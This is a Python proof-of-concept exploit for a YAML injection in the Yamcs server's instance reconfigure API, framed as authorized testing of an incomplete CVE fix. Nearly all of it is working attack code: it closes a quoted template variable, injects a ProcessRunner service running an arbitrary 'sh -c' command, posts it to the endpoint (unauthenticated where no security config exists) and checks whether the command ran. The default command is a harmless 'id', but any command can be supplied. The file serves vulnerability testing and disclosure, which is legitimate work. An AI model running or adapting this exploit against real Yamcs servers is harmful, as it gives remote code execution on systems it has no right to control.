#!/usr/bin/env python3
"""
Dynamic PoC: Yamcs reconfigure() YAML-structure injection -> RCE
Incomplete fix of CVE-2026-55559. Advisory: GHSA-wqq5-5w4p-m569. Fixed in 5.13.6.

Authorized security testing only. Run against a Yamcs server you own.

What it does
------------
createInstance() was hardened to use template.processAndSanitizeYaml(), but the
sibling reconfigureInstance() (<= 5.13.5) still rendered user template args with
the raw template.process(). A template that places a variable inside a quoted
YAML scalar, e.g.  name: "{{ spaceSystem }}" , lets an attacker close the quote
and inject a top-level  services:  entry. SnakeYAML keeps the last duplicate key,
so an injected org.yamcs.ProcessRunner runs an arbitrary command when the
instance restarts after reconfiguration.

This script injects a BENIGN command (default: id) that writes its output to a
marker file, then reports whether it executed.

Detection
---------
  marker : if the marker path is readable locally (server on this host), its
           contents are definitive proof of command execution -> VULNERABLE.
  response: otherwise it inspects the reconfigure response. If the injected
           payload survives verbatim as the space-system name (contains
           'org.yamcs.ProcessRunner'), the input was neutralised -> SAFE;
           if the structure was consumed, the target is likely VULNERABLE.

Preconditions: target < 5.13.6, reconfigure endpoint reachable, a templated
instance exists (use --create), and either no security.yaml (guest superuser,
unauthenticated) or a --token with the CreateInstances privilege.
"""
import argparse
import json
import sys
import time
import urllib.error
import urllib.request


def http(url, method="GET", body=None, token=None, timeout=20):
    data = json.dumps(body).encode() if body is not None else None
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return None, repr(e)


def build_injection(prefix, cmd, marker):
    """Value for the injected template variable: close the quoted scalar, add a
    top-level services: ProcessRunner, comment out the template remainder."""
    return (
        prefix + '"\n'
        "services:\n"
        "  - class: org.yamcs.ProcessRunner\n"
        "    args:\n"
        '      command: ["sh","-c","%s > %s 2>&1"]\n'
        "#" % (cmd, marker)
    )


def read_marker_local(path):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            return fh.read().strip()
    except OSError:
        return None


def main():
    ap = argparse.ArgumentParser(description="Yamcs reconfigure YAML-injection dynamic PoC")
    ap.add_argument("--url", default="http://127.0.0.1:8090", help="Yamcs base URL")
    ap.add_argument("--instance", default="poc", help="templated instance name")
    ap.add_argument("--template", default="example", help="instance template (for --create)")
    ap.add_argument("--var", default="spaceSystem", help="template variable rendered in a quoted scalar")
    ap.add_argument("--cmd", default="id", help="benign command to execute on the target")
    ap.add_argument("--marker", default="/tmp/yamcs_poc_%d" % int(time.time()),
                    help="file the injected command writes to (on the server)")
    ap.add_argument("--prefix", default="poc", help="benign scalar value before the breakout")
    ap.add_argument("--arg", action="append", default=[], metavar="K=V",
                    help="extra template arg, repeatable (e.g. --arg 'bar=Option 2')")
    ap.add_argument("--token", help="OAuth bearer token (omit for unauthenticated/default config)")
    ap.add_argument("--create", action="store_true", help="create the templated instance first")
    ap.add_argument("--wait", type=float, default=6.0, help="seconds to wait for the restart")
    ap.add_argument("--local-check", action="store_true",
                    help="read the marker on the local filesystem (server runs on this host)")
    args = ap.parse_args()

    extra = {}
    for kv in args.arg:
        if "=" not in kv:
            ap.error("--arg must be K=V, got %r" % kv)
        k, v = kv.split("=", 1)
        extra[k] = v

    base = args.url.rstrip("/")
    print("[*] target    : %s" % base)
    print("[*] instance  : %s   template: %s   var: %s" % (args.instance, args.template, args.var))
    print("[*] payload   : %s -> %s  (benign)" % (args.cmd, args.marker))

    if args.create:
        benign = {args.var: args.prefix}
        benign.update(extra)
        st, body = http(base + "/api/instances", "POST",
                        {"name": args.instance, "template": args.template, "templateArgs": benign},
                        token=args.token)
        print("[*] create    : HTTP %s" % st)
        if st not in (200, None) and "already" not in body.lower():
            # 200 = created; an "already exists" error is fine (reuse it).
            if st and st >= 400 and "already" not in body.lower():
                print("    %s" % body[:200])

    inj = build_injection(args.prefix, args.cmd, args.marker)
    targs = {args.var: inj}
    targs.update(extra)
    st, body = http(base + "/api/instances/%s:reconfigure" % args.instance, "POST",
                    {"templateArgs": targs}, token=args.token)
    print("[*] reconfigure: HTTP %s" % st)
    if st is None:
        print("[-] no response from target: %s" % body)
        return 1

    print("[*] waiting %.1fs for instance restart ..." % args.wait)
    time.sleep(args.wait)

    # 1) definitive: marker on local filesystem
    if args.local_check:
        out = read_marker_local(args.marker)
        if out:
            print("[!] command output (as the Yamcs service account):")
            print("    " + out.replace("\n", "\n    "))
            print("[!] RESULT: VULNERABLE  --  remote code execution")
            return 2
        print("[+] marker not present locally -> command did not execute")
        print("[+] RESULT: SAFE")
        return 0

    # 2) remote heuristic from the reconfigure response
    interpreted_as_data = "org.yamcs.ProcessRunner" in body
    if interpreted_as_data:
        print("[+] payload survived as data in the space-system name (sanitised)")
        print("[+] RESULT: SAFE  --  neutralised by processAndSanitizeYaml")
        return 0
    print("[!] injected YAML structure was consumed (not reflected as data)")
    print("[!] RESULT: LIKELY VULNERABLE  --  verify the marker %s on the server" % args.marker)
    return 2


if __name__ == "__main__":
    sys.exit(main())
